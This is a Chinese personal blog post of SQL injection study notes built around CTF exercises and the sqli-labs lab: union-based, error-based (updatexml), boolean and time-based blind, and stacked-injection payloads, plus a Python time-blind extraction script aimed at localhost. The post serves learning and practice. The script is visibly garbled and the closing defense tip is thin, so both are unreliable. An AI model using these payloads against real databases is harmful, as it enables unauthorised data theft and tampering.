<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#ffb6c1"><meta name="baidu-site-verification"><title>第十篇博客 | 云芽的博客</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="云芽的博客" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">云芽的博客</a></h1></div><p class="m-desc">好好fighting，好好waiting!</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">第十篇博客</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/08/14/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/">2021-08-14</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="常见注入姿势："><a href="#常见注入姿势：" class="headerlink" title="常见注入姿势："></a>常见注入姿势：</h3><p>####联合查询注入</p>
<p>联合查询的基本要求：1.查询列数必须一致；2.查询语句的查询的各列类型、顺序最好一致。</p>
<p>联合查询的步骤：</p>
<ol>
<li><p>闭合：</p>
<p>方法一：使用注释符闭合</p>
<p>sql语句如下该如何注入：</p>
<pre><code class="sql">$id = $_GET[&#39;id&#39;];
$sql = &quot;select * from data where id =&#39; &quot; . $id .&quot;&#39;&quot;;//引号不配对
</code></pre>
<p>答案是：id=1’#或1’– -</p>
<p>分析：如果我们只输入一个单引号，原本sql语句中多余的单引号就会导致整个aql语句报错。因此在后面加上#或–来将多余的单引号注释掉。</p>
<p>方法二：不使用注释符闭合</p>
<p>sql语句如下：</p>
<pre><code class="sql">$id = $_GET[&#39;id&#39;];
$sql = &quot;select * from data where id = &#39;$id&#39; limit 0,1&quot;;
</code></pre>
<p>答案：id=1’ or ‘1’=’1即构造select * from data where id = ‘1’ or ‘1’=’1’</p>
<p>注：常见的注释符：%23（#）、–+、；%00、`、……</p>
<p>方法三：CTF中有时会把常用注释符以及单引号都给ban了，那又该怎么闭合呢？</p>
<pre><code class="sql">$id = $_GET[&#39;id&#39;];
$sql = &quot;select * from data where username= &#39;&quot; .$username .&quot;&#39;and password = &#39;&quot;.$password.&quot;&#39; &quot;;
</code></pre>
<p>答案：通过使用“\”来将$$$username$$后面的单引号转义，然后想办法在$$$password$$部分注释掉后面的单引号即</p>
<pre><code class="sql">select * from data where username= &#39;\&#39;and password = &#39; or 1=1 ;%00&#39;//&#39;\&#39;and password = &#39;整个为username的值；or 1=1 ;%00为我们输入的password的值，;%00可以用来闭合后面的单引号
</code></pre>
</li>
<li><p>判断字段数：</p>
<p> 可以用order by +正整数来进行判断，如果超出表格范围即所选字段大于表格所有则会报错。</p>
<p>小知识：order by：如果后面接的是整形（从1开始的正整数），则根据第几个字段进行排序。</p>
</li>
<li><p>判断结果输出位置</p>
<p>UNION操作符用于合并两个或多个SELECT语句的结果集</p>
<p>select * from 表名 where id = ‘-1’ union select 1,2,3；//由于id=-1为空集，因此我们的输入的1，2，3会出现在第一行即username=2，password=3</p>
<p>select * from 表名 where id = ‘1’ union select 1,2,3；//id=1非空，因此我们的输入的1，2，3会出现在第二行，正常搜索到的在第一行username=Dmub，password=Dumb</p>
<p>在sqli-labs中，输出的结果字段为2和3，因此我们需要输出结果改变时应更改2和3的值</p>
<img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210816164303527.png" alt="image-20210816164303527" style="zoom: 80%;" /></li>
<li><p>爆库、爆表、爆列</p>
<p>TABLE表：提供了关于数据库中的表的信息（包括视图）</p>
<p>COLUMNS表：提供了表中的列信息即字段数</p>
<p>table_schema=database()只会搜索当前数据库</p>
<p>group_concat()函数将结果集整合成一句话输出，其间用逗号隔开</p>
<p>爆破库名：</p>
<ul>
<li>union select 1,2,database()</li>
</ul>
<p>爆表名：</p>
<ul>
<li>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</li>
<li> union select 1,2, group_concat(table_name) from information_schema.columns where table_schema=database()</li>
</ul>
<p>爆Column名：</p>
<ul>
<li>union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database()</li>
</ul>
</li>
</ol>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p>
<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>TIPS：<br>1.报错注入有长度限制，不同的函数限制不一样。</p>
<p>报错注入常用到的函数：（很多函数有版本限制，以下两个函数仅有长度限制，报错注入只允许32位的信息——&gt;突破长度限制方法：分段读取输出或反向读取再正向输出）</p>
<ol>
<li><p>Updatexml:史新xml文档的函数。<br>语法: updatexml(文档类型，==xpath路径==，更新的内容)</p>
<p>例如：<a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=-1&#39;">http://localhost/Less-1/?id=-1&#39;</a> and updatexml(0x0a,concat(0x0a,(select database())),-1)–+其中%0x0a相当于换行符，由于第二个0x0a是多余的，因此会报错输出所拼接的database()</p>
</li>
<li><p>Extractvalue:对XML文档进行查询的函数<br>语法:extractvalue(文档类型，==xpath路径==)</p>
</li>
</ol>
<p>报错原理:</p>
<p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容。</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>布尔盲注：</strong></p>
<p>定义：可以通过网页上两种不同的回显的注入。</p>
<p>步骤：</p>
<ol>
<li>闭合</li>
<li>找到永真和永假的两种情况</li>
<li>利用这两种情况进行对数据一位一位的获取</li>
</ol>
<p>涉及到的函数：</p>
<ol>
<li><p>substr：字符串截取函数</p>
<p>例子：substr(database(),1,1)，//从第一位开始截，截一位即截取当前数据库的第一位。</p>
</li>
<li><p>ascii：把字符转为acsii码</p>
</li>
</ol>
<p><strong>时间盲注：</strong></p>
<p>定义：</p>
<p>可以通过时间差导致的两种不同的回显的注入。——&gt;（网页上看不出差别即非布尔盲注）可用Burpsuite进行抓包分析时间来进行进行判断</p>
<p>涉及到的函数：</p>
<p>if表达式：IF(expr1,expr2,expr3)：</p>
<p>如果expr1是TRUE，则IF()的返回值为expr2；否则返回值则为expr3.</p>
<p>sleep()函数为延迟的时间。例如：sleep(3)为延迟3秒.</p>
<p>方法：（共五种，以下前两种较为常用）</p>
<ol>
<li>简单好用sleep()：找到正确的值时延迟一下</li>
<li>BENCHMARK：以大量操作进行演示。例如：select benchmark(10000000,sha(1))</li>
<li>笛卡尔积</li>
</ol>
<p><strong>爆破：</strong></p>
<ol>
<li><p>手爆：</p>
<p>思路：</p>
<ol>
<li><p>如果不怕累可以手爆</p>
<p>栗子：</p>
<p>当前第一位为s（ascii码为115）则?id=1’ and (ascii(substr(database(),1,1))=115)-&gt;时才显示正确输出，手爆过程即将等号后面的数值从1开始一直加一进行测试</p>
</li>
<li><p>用burpsuite爆破</p>
<p>布尔盲注时：burpsuite：intruder–positions–攻击类型（集束炸弹）–更改需要进行爆破的字段的有效负载集和载荷类型。例如：</p>
<img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210816223344841.png" alt="image-20210816223344841" style="zoom:50%;" />

<p>而后可根据爆破出的回显长度进行判断。</p>
</li>
<li><p>用python脚本</p>
<p>栗子：sqli-labs第九关</p>
<pre><code class="python">import string
import requests
proxies = &#123;
    &quot;http&quot; : &quot;http://127.0.0.1:8080&quot;,
    &quot;https&quot; : &quot;http://127.0.0.1:8080”&quot;，
&#125;
session = requests.Session( )
if __name__ == &#39; __main___ &#39;:
    text =&quot;&quot;
    my_list =string.printable
    for length in range( 1，50):
        for word in my_list:
            sql = &quot;database( )&quot;
            payload = &quot;1&#39; and if(ascii( substr((%s ),%d,1))=%d ,sleep(2),1) -- “ % (sql,length,ord(word))
            paramsGet = i &quot;id&quot; : payload&#125;
            headers = &#123; &quot;Sec-Fetch-Site&quot;: &quot;none&quot;,&quot;Sec-Fetch-Dest&quot;:&quot;document&quot;，&quot;Sec-
Fetch-User&quot; : &quot;?1&quot;,
                        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;，&quot;Sec-Fetch-Mode&quot;: “navigate&quot;&#125;
            try:
               response = session.get( &quot;http://localhost/Less-9/&quot;,params=paramsGet,headers=headers,proxies=proxies,
                                        timeout=2)
except Exception:
    text += word
    print( text)
    break
</code></pre>
</li>
</ol>
</li>
</ol>
<p><strong>堆叠注入：</strong></p>
<p>简单理解：</p>
<p>将前面的语句断掉，再在后面插入自己的逻辑/语句</p>
<p>例如：</p>
<p>?id=1’;nsert into users values(‘114’,database(),’hahahaha’);–+//?id=1’;中的分号将前面注释掉了，后面是我们插入的内容，users表中字段分别对应id=114,username=database()查询时显示security,password=hahahaha。</p>
<h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p><strong>推荐文章：</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/205376">https://www.anquanke.com/post/id/205376</a> SQL注入基础整理及Tricks总结<br><a target="_blank" rel="noopener" href="http://yulige.top/?p=80%E9%83%81%E7%A6%BB%E6%AD%8C%E5%B8%88%E5%82%85%E7%9A%84SQLI-LABS%E4%BF%AE%E7%82%BC%E7%AC%94%E8%AE%B0(%E4%B8%80)">http://yulige.top/?p=80郁离歌师傅的SQLI-LABS修炼笔记(一)</a> ( 刷sqli-labs推荐)<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7575">https://xz.aliyun.com/t/7575</a> sql盲注的效率分析</p>
<p><strong>sql防御方法：</strong></p>
<p>可利用addcslashes()函数将输出进行过滤，将单引号转义使之无法闭合等</p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">yunya</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/08/14/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/">http://example.com/2021/08/14/第十篇博客/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://example.com">yunya的博客</a>！</span></div></blockquote></div></article><div class="p-info box"></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">常见注入姿势：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">小知识</span></a></li></ol></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2021/08/16/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">&lt; 第十一篇博客</a><a class="next" href="/2021/08/08/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/">第九篇博客 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2021 <a href="/." rel="nofollow">云芽的博客</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>